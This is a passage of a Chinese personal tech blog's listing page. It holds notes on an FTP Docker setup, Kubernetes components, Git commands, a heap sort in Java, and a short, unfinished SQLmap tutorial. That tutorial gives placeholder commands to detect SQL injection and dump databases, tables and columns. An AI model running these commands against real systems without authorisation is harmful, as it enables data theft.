<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ftp -p ip 21</span><br><span class="line"></span><br><span class="line">用户/密码   test/test</span><br><span class="line"></span><br><span class="line">上传文件   put [本地路径]  [上传路径]</span><br></pre></td></tr></table></figure>



<p>实现匿名访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it [content-id] bash</span><br><span class="line"></span><br><span class="line">$ cd /etc/pure-ftpd/conf</span><br><span class="line">$ vi NoAnonymous</span><br><span class="line">改为no</span><br><span class="line"></span><br><span class="line">$ service vsftpd restart</span><br></pre></td></tr></table></figure>



<p>如果出现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash: vi: command not found</span><br></pre></td></tr></table></figure>

<p>解决办法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install vim</span><br><span class="line">vim NoAnonymous</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://lyuane.github.io/2018/10/14/2018-10-14-k8s%E6%A6%82%E5%BF%B5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="沄渊">
      <meta itemprop="description" content="路漫漫其修远兮,吾将上下而求索">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="沄渊">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2018/10/14/2018-10-14-k8s%E6%A6%82%E5%BF%B5/" class="post-title-link" itemprop="url">k8s概念</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2018-10-14 00:00:00" itemprop="dateCreated datePublished" datetime="2018-10-14T00:00:00+08:00">2018-10-14</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="0x01-kubernetes-组件"><a href="#0x01-kubernetes-组件" class="headerlink" title="0x01 kubernetes 组件"></a>0x01 kubernetes 组件</h1><p>kubernetes 容器集群管理系统 实现容器集群自动化部署、自动化扩缩融、维护等功能</p>
<h3 id="Kubernetes-特点"><a href="#Kubernetes-特点" class="headerlink" title="Kubernetes 特点"></a>Kubernetes 特点</h3><ul>
<li><strong>可移植</strong>: 支持公有云，私有云，混合云，多重云（multi-cloud）</li>
<li><strong>可扩展</strong>: 模块化, 插件化, 可挂载, 可组合</li>
<li><strong>自动化</strong>: 自动部署，自动重启，自动复制，自动伸缩/扩展</li>
</ul>
<h3 id="Kubernetes-能做什么"><a href="#Kubernetes-能做什么" class="headerlink" title="Kubernetes 能做什么"></a>Kubernetes 能做什么</h3><p>可以在物理或虚拟机的集群上运行容器化应用 提供以容器为中心的基础架构 满足生产化境中运行应用的一些常见需求</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://docs.kubernetes.org.cn/312.html">多个进程（作为容器运行）协同工作。</a>（Pod）</li>
<li>存储系统挂载</li>
<li>Distributing secrets</li>
<li>应用健康检测</li>
<li><a target="_blank" rel="noopener" href="http://docs.kubernetes.org.cn/314.html">应用实例的复制</a></li>
<li>Pod自动伸缩/扩展</li>
<li>Naming and discovering</li>
<li>负载均衡</li>
<li>滚动更新</li>
<li>资源监控</li>
<li>日志访问</li>
<li>调试应用程序</li>
<li><a target="_blank" rel="noopener" href="http://docs.kubernetes.org.cn/51.html">提供认证和授权</a></li>
</ul>
<h1 id="0x02-k8s-组件"><a href="#0x02-k8s-组件" class="headerlink" title="0x02 k8s 组件"></a>0x02 k8s 组件</h1><h2 id="2-1-master-组件"><a href="#2-1-master-组件" class="headerlink" title="2.1 master 组件"></a>2.1 master 组件</h2><p>提供集群的管理控制中心</p>
<p>可以在集群任何节点运行，但是通常在一台机器上启动所有master组件</p>
<h3 id="kube-apiserver"><a href="#kube-apiserver" class="headerlink" title="kube-apiserver"></a>kube-apiserver</h3><p>用于暴露k8s API    </p>
<p>任何的资源请求/调用操作都是通过kube-apiserver提供的接口进行</p>
<h3 id="ETCD"><a href="#ETCD" class="headerlink" title="ETCD"></a>ETCD</h3><p>k8s默认的存储系统 保存所有集群数据</p>
<p>使用时需要为etcd提供备份计划</p>
<h3 id="kube-controller-manager"><a href="#kube-controller-manager" class="headerlink" title="kube-controller-manager"></a>kube-controller-manager</h3><p>运行管理控制器，它们是集群中处理常规任务的后台线程。</p>
<p>逻辑上，每个控制器是一个单独的进程，但为了降低复杂性，它们都被编译成单个二进制文件，并在单个进程中运行。</p>
<p>这些控制器包括：</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://docs.kubernetes.org.cn/304.html">节点（Node）控制器</a>。</li>
<li>副本（Replication）控制器：负责维护系统中每个副本中的pod。</li>
<li>端点（Endpoints）控制器：填充Endpoints对象（即连接Services＆Pods）。</li>
<li><a target="_blank" rel="noopener" href="http://docs.kubernetes.org.cn/84.html">Service Account</a>和Token控制器：为新的<a target="_blank" rel="noopener" href="http://docs.kubernetes.org.cn/242.html">Namespace</a> 创建默认帐户访问API Token。</li>
</ul>
<h3 id="cloud-controller-manager"><a href="#cloud-controller-manager" class="headerlink" title="cloud-controller-manager"></a>cloud-controller-manager</h3><p>云控制器管理器负责与底层云提供商的平台交互。云控制器管理器是Kubernetes版本1.6中引入的，目前还是Alpha的功能。</p>
<p>云控制器管理器仅运行云提供商特定的（controller loops）控制器循环。可以通过将<code>--cloud-provider</code> flag设置为external启动kube-controller-manager ，来禁用控制器循环。</p>
<p>cloud-controller-manager 具体功能：</p>
<ul>
<li>节点（Node）控制器</li>
<li>路由（Route）控制器</li>
<li>Service控制器</li>
<li>卷（Volume）控制器</li>
</ul>
<h3 id="kube-scheduler"><a href="#kube-scheduler" class="headerlink" title="kube-scheduler"></a>kube-scheduler</h3><p>kube-scheduler 监视新创建没有分配到<a target="_blank" rel="noopener" href="http://docs.kubernetes.org.cn/304.html">Node</a>的<a target="_blank" rel="noopener" href="http://docs.kubernetes.org.cn/312.html">Pod</a>，为Pod选择一个Node。</p>
<h3 id="插件-addons"><a href="#插件-addons" class="headerlink" title="插件 addons"></a>插件 addons</h3><p>插件（addon）是实现集群pod和Services功能的 。Pod由<a target="_blank" rel="noopener" href="http://docs.kubernetes.org.cn/317.html">Deployments</a>，ReplicationController等进行管理。Namespace 插件对象是在kube-system Namespace中创建。</p>
<p>具体插件信息：<a target="_blank" rel="noopener" href="http://docs.kubernetes.org.cn/230.html#kube-scheduler">http://docs.kubernetes.org.cn/230.html#kube-scheduler</a></p>
<h2 id="2-2-节点（node）组件"><a href="#2-2-节点（node）组件" class="headerlink" title="2.2 节点（node）组件"></a>2.2 节点（node）组件</h2><p>提供K8s运行时环境及维护Pod</p>
<h3 id="kubelet"><a href="#kubelet" class="headerlink" title="kubelet"></a>kubelet</h3><p><a target="_blank" rel="noopener" href="https://kubernetes.io/docs/admin/kubelet">kubelet</a>是主要的节点代理，它会监视已分配给节点的pod，具体功能：</p>
<ul>
<li>安装Pod所需的volume。</li>
<li>下载Pod的Secrets。</li>
<li>Pod中运行的 docker（或experimentally，rkt）容器。</li>
<li>定期执行容器健康检查。</li>
<li>Reports the status of the pod back to the rest of the system, by creating a <em>mirror pod</em> if necessary.</li>
<li>Reports the status of the node back to the rest of the system.</li>
</ul>
<h3 id="kube-proxy"><a href="#kube-proxy" class="headerlink" title="kube-proxy"></a>kube-proxy</h3><p><a target="_blank" rel="noopener" href="https://kubernetes.io/docs/admin/kube-proxy">kube-proxy</a>通过在主机上维护网络规则并执行连接转发来实现Kubernetes服务抽象。</p>
<h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><p>docker用于运行容器。</p>
<h3 id="RKT"><a href="#RKT" class="headerlink" title="RKT"></a>RKT</h3><p>rkt运行容器，作为docker工具的替代方案。</p>
<h3 id="supervisord"><a href="#supervisord" class="headerlink" title="supervisord"></a>supervisord</h3><p>supervisord是一个轻量级的监控系统，用于保障kubelet和docker运行。</p>
<h3 id="fluentd"><a href="#fluentd" class="headerlink" title="fluentd"></a>fluentd</h3><p>fluentd是一个守护进程，可提供<a target="_blank" rel="noopener" href="https://kubernetes.io/docs/concepts/overview/components/#cluster-level-logging">cluster-level logging</a>.</p>
<h1 id="0x03-k8s对象"><a href="#0x03-k8s对象" class="headerlink" title="0x03 k8s对象"></a>0x03 k8s对象</h1><p>k8s系统中的持久实体，使用这些实体表示集群状态</p>
<p>具体来说，他们可以描述：</p>
<ul>
<li><p>容器化应用正在运行(以及在哪些节点上)</p>
</li>
<li><p>这些应用可用的资源</p>
</li>
<li><p>关于这些应用如何运行的策略，如重新策略，升级和容错</p>
</li>
</ul>
<p>填坑  不想记笔记了</p>
<p>传送门：<a target="_blank" rel="noopener" href="http://docs.kubernetes.org.cn/232.html">http://docs.kubernetes.org.cn/232.html</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://lyuane.github.io/2018/09/15/2018-09-15-Git%E6%8C%87%E4%BB%A4%E6%95%B4%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="沄渊">
      <meta itemprop="description" content="路漫漫其修远兮,吾将上下而求索">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="沄渊">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2018/09/15/2018-09-15-Git%E6%8C%87%E4%BB%A4%E6%95%B4%E7%90%86/" class="post-title-link" itemprop="url">Git指令</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2018-09-15 00:00:00" itemprop="dateCreated datePublished" datetime="2018-09-15T00:00:00+08:00">2018-09-15</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="0x01-GitHub创建仓库提示代码"><a href="#0x01-GitHub创建仓库提示代码" class="headerlink" title="0x01  GitHub创建仓库提示代码"></a>0x01  GitHub创建仓库提示代码</h3><pre><code>echo &quot;# 项目名&quot; &gt;&gt; README.md
git init
git add README.md
git commit -m &quot;first commit&quot;
git remote add origin git@github.com:qiubaiying/项目名.git
git push -u origin master
</code></pre>
<p>若仓库存在直接push</p>
<pre><code>git remote add origin git@github.com:qiubaiying/test.git
git push -u origin master
</code></pre>
<h3 id="0x02-常用操作"><a href="#0x02-常用操作" class="headerlink" title="0x02  常用操作"></a>0x02  常用操作</h3><h4 id="创建仓库（初始化）"><a href="#创建仓库（初始化）" class="headerlink" title="创建仓库（初始化）"></a>创建仓库（初始化）</h4><pre><code>在当前指定目录下创建
git init

新建一个仓库目录
git init [project-name]

克隆一个远程项目
git clone [url]
</code></pre>
<h4 id="添加文件到缓存区"><a href="#添加文件到缓存区" class="headerlink" title="添加文件到缓存区"></a>添加文件到缓存区</h4><pre><code>添加所有变化的文件
 git add .

添加名称指定文件
git add text.txt
</code></pre>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><pre><code>设置提交代码时的用户信息
git config [--global] user.name &quot;[name]&quot;
git config [--global] user.email &quot;[email address]&quot;
</code></pre>
<p>​    </p>
<h4 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h4><pre><code>提交暂存区到仓库区
git commit -m &quot;msg&quot;

# 提交暂存区的指定文件到仓库区
$ git commit [file1] [file2] ... -m [message]

# 提交工作区自上次commit之后的变化，直接到仓库区
$ git commit -a

# 提交时显示所有diff信息
$ git commit -v

# 使用一次新的commit，替代上一次提交
# 如果代码没有任何新变化，则用来改写上一次commit的提交信息
$ git commit --amend -m [message]

# 重做上一次commit，并包括指定文件的新变化
$ git commit --amend [file1] [file2] ...
</code></pre>
<h4 id="远程同步"><a href="#远程同步" class="headerlink" title="远程同步"></a>远程同步</h4><pre><code># 下载远程仓库的所有变动
$ git fetch [remote]

# 显示所有远程仓库
$ git remote -v

# 显示某个远程仓库的信息
$ git remote show [remote]

# 增加一个新的远程仓库，并命名
$ git remote add [shortname] [url]

# 取回远程仓库的变化，并与本地分支合并
$ git pull [remote] [branch]

# 上传本地指定分支到远程仓库
$ git push [remote] [branch]

# 强行推送当前分支到远程仓库，即使有冲突
$ git push [remote] --force

# 推送所有分支到远程仓库
$ git push [remote] --all
</code></pre>
<p>​    </p>
<h4 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h4><pre><code># 列出所有本地分支
$ git branch

# 列出所有远程分支
$ git branch -r

# 列出所有本地分支和远程分支
$ git branch -a

# 新建一个分支，但依然停留在当前分支
$ git branch [branch-name]

# 新建一个分支，并切换到该分支
$ git checkout -b [branch]

# 新建一个分支，指向指定commit
$ git branch [branch] [commit]

# 新建一个分支，与指定的远程分支建立追踪关系
$ git branch --track [branch] [remote-branch]

# 切换到指定分支，并更新工作区
$ git checkout [branch-name]

# 切换到上一个分支
$ git checkout -

# 建立追踪关系，在现有分支与指定的远程分支之间
$ git branch --set-upstream [branch] [remote-branch]

# 合并指定分支到当前分支
$ git merge [branch]

# 选择一个commit，合并进当前分支
$ git cherry-pick [commit]

# 删除分支
$ git branch -d [branch-name]

# 删除远程分支
$ git push origin --delete [branch-name]
$ git branch -dr [remote/branch]
</code></pre>
<h4 id="标签Tags"><a href="#标签Tags" class="headerlink" title="标签Tags"></a>标签Tags</h4><pre><code>添加标签 在当前commit
git tag -a v1.0 -m &#39;xxx&#39; 

添加标签 在指定commit
git tag v1.0 [commit]

查看
git tag

删除
git tag -d V1.0

删除远程tag
git push origin :refs/tags/[tagName]

推送
git push origin --tags

拉取
git fetch origin tag V1.0

新建一个分支，指向某个tag
git checkout -b [branch] [tag]
</code></pre>
<h4 id="查看信息"><a href="#查看信息" class="headerlink" title="查看信息"></a>查看信息</h4><pre><code># 显示有变更的文件
$ git status

# 显示当前分支的版本历史
$ git log

# 显示commit历史，以及每次commit发生变更的文件
$ git log --stat

# 搜索提交历史，根据关键词
$ git log -S [keyword]

# 显示某个commit之后的所有变动，每个commit占据一行
$ git log [tag] HEAD --pretty=format:%s

# 显示某个commit之后的所有变动，其&quot;提交说明&quot;必须符合搜索条件
$ git log [tag] HEAD --grep feature

# 显示某个文件的版本历史，包括文件改名
$ git log --follow [file]
$ git whatchanged [file]

# 显示指定文件相关的每一次diff
$ git log -p [file]

# 显示过去5次提交
$ git log -5 --pretty --oneline

# 显示所有提交过的用户，按提交次数排序
$ git shortlog -sn

# 显示指定文件是什么人在什么时间修改过
$ git blame [file]

# 显示暂存区和工作区的差异
$ git diff

# 显示暂存区和上一个commit的差异
$ git diff --cached [file]

# 显示工作区与当前分支最新commit之间的差异
$ git diff HEAD

# 显示两次提交之间的差异
$ git diff [first-branch]...[second-branch]

# 显示今天你写了多少行代码
$ git diff --shortstat &quot;@&#123;0 day ago&#125;&quot;

# 显示某次提交的元数据和内容变化
$ git show [commit]

# 显示某次提交发生变化的文件
$ git show --name-only [commit]

# 显示某次提交时，某个文件的内容
$ git show [commit]:[filename]

# 显示当前分支的最近几次提交
$ git reflog
</code></pre>
<h4 id="撤销"><a href="#撤销" class="headerlink" title="撤销"></a>撤销</h4><pre><code># 恢复暂存区的指定文件到工作区
$ git checkout [file]

# 恢复某个commit的指定文件到暂存区和工作区
$ git checkout [commit] [file]

# 恢复暂存区的所有文件到工作区
$ git checkout .

# 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变
$ git reset [file]

# 重置暂存区与工作区，与上一次commit保持一致
$ git reset --hard

# 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变
$ git reset [commit]

# 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致
$ git reset --hard [commit]

# 重置当前HEAD为指定commit，但保持暂存区和工作区不变
$ git reset --keep [commit]

# 新建一个commit，用来撤销指定commit
# 后者的所有变化都将被前者抵消，并且应用到当前分支
$ git revert [commit]

# 暂时将未提交的变化移除，稍后再移入
$ git stash
$ git stash pop
</code></pre>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><pre><code># 生成一个可供发布的压缩包
$ git archives
</code></pre>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://lyuane.github.io/2018/08/27/2018-08-27-sqlmap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="沄渊">
      <meta itemprop="description" content="路漫漫其修远兮,吾将上下而求索">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="沄渊">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2018/08/27/2018-08-27-sqlmap/" class="post-title-link" itemprop="url">SQLmap学习</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2018-08-27 00:00:00" itemprop="dateCreated datePublished" datetime="2018-08-27T00:00:00+08:00">2018-08-27</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h3><p>sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p>
<p>sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测。</p>
<p>sqlmap支持五种不同的注入模式：</p>
<blockquote>
<p>基于布尔的盲注，即可以根据返回页面判断条件真假的注入；</p>
<p>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</p>
<p>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</p>
<p>联合查询注入，可以使用union的情况下的注入；</p>
<p>堆查询注入，可以同时执行多条语句的执行时的注入</p>
</blockquote>
<h3 id="0x02-简易快速使用"><a href="#0x02-简易快速使用" class="headerlink" title="0x02 简易快速使用"></a>0x02 简易快速使用</h3><h4 id="get方法"><a href="#get方法" class="headerlink" title="get方法"></a>get方法</h4><p>检测注入点</p>
<pre><code>sqlmap -u [URL] -p [port] --batch
</code></pre>
<p>爆库</p>
<pre><code>sqlmap -u [URL] -p [port] --dbs
</code></pre>
<p>爆当前库</p>
<pre><code>sqlmap -u [URL] -p [port] --current-db
</code></pre>
<p>爆表</p>
<pre><code>sqlmap -u [URL] -p [port] -D [数据库名] --tables
</code></pre>
<p>爆字段</p>
<pre><code>sqlmap -u [URL] -p [port] -D [database name] -T [table name] --columns
</code></pre>
<p>dump指定字段</p>
<pre><code>sqlmap -u [URL] -p [port] -D [database name] -T [table name] -C [colums name] --dump
</code></pre>
<h4 id="post方法"><a href="#post方法" class="headerlink" title="post方法"></a>post方法</h4><p>tips:配合burpsuite使用</p>
<h3 id="0x03-参数详解"><a href="#0x03-参数详解" class="headerlink" title="0x03 参数详解"></a>0x03 参数详解</h3><h4 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h4><p>-h/help 显示基本帮助信息<br>-hh 显示高级帮助信息<br>-veision 显示版本信息</p>
<h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><p>-d ??</p>
<p>-u URL , -url=’URL’  目标URL</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://lyuane.github.io/2018/08/26/2018-08-26-%E5%A0%86%E6%8E%92%E5%BA%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="沄渊">
      <meta itemprop="description" content="路漫漫其修远兮,吾将上下而求索">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="沄渊">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2018/08/26/2018-08-26-%E5%A0%86%E6%8E%92%E5%BA%8F/" class="post-title-link" itemprop="url">堆排序</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2018-08-26 00:00:00" itemprop="dateCreated datePublished" datetime="2018-08-26T00:00:00+08:00">2018-08-26</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>函数解释</p>
<p>heapinsert()   在一个大根堆中再添加一个数字使其重新变为大根堆</p>
<p>heapify()    当大根堆中某个数字发生变化后使数组重新变为大根堆</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">heapsort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] array=&#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">4</span>&#125;;</span><br><span class="line">        heapSort(array);<span class="comment">//堆排序</span></span><br><span class="line">        printArray(array);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">heapSort</span><span class="params">(<span class="keyword">int</span>[] array)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(array==<span class="keyword">null</span> ||array.length&lt;<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;array.length;i++)&#123;<span class="comment">//将无序数组变成大根堆</span></span><br><span class="line">            heapinsert(array,i);</span><br><span class="line">        &#125;</span><br><span class="line">        printArray(array);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> size = array.length;<span class="comment">//利用heapify函数每次确定未排序数组的最后一位</span></span><br><span class="line">        swap(array,<span class="number">0</span>,--size);</span><br><span class="line">        <span class="keyword">while</span>(size&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            heapify(array,<span class="number">0</span>,size);</span><br><span class="line">            swap(array,<span class="number">0</span>,--size);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">heapinsert</span><span class="params">(<span class="keyword">int</span>[] array , <span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(array[index]&gt;array[(index-<span class="number">1</span>)/<span class="number">2</span>])&#123;</span><br><span class="line">            swap(array,index,(index-<span class="number">1</span>)/<span class="number">2</span>);</span><br><span class="line">            index = (index-<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">heapify</span><span class="params">(<span class="keyword">int</span>[] array, <span class="keyword">int</span> index, <span class="keyword">int</span> size)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = index*<span class="number">2</span>+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;size)&#123;</span><br><span class="line">            <span class="keyword">int</span> largest = left+<span class="number">1</span>&lt;size &amp;&amp; array[left+<span class="number">1</span>]&gt;array[left]  ?   left+<span class="number">1</span>:left;</span><br><span class="line">            largest =array[largest]&gt;array[index]?largest:index;</span><br><span class="line">            <span class="keyword">if</span>(largest==index)  <span class="keyword">break</span>;</span><br><span class="line">            swap(array,index,largest);</span><br><span class="line">            index=largest;</span><br><span class="line">            left=index*<span class="number">2</span>+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] array, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp = array[l];</span><br><span class="line">        array[l]=array[r];</span><br><span class="line">        array[r]=temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// for test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (arr == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            System.out.print(arr[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">沄渊</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
